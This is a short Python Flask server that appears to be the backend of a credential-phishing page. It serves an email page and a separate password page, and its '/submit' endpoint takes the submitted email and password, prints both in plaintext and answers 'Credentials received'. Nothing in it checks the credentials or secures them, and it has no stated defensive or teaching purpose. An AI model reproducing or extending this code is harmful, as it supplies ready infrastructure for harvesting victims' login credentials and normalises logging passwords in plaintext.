from flask import Flask, render_template, request, jsonify, send_from_directory
import os

app = Flask(__name__, static_folder='static')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/password')
def password():
    return render_template('password.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    print(f"Email: {email}, Password: {password}")
    return jsonify({'message': 'Credentials received'})

# Explicit route to serve static files (for some deployment platforms)
@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory(os.path.join(app.root_path, 'static'), filename)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)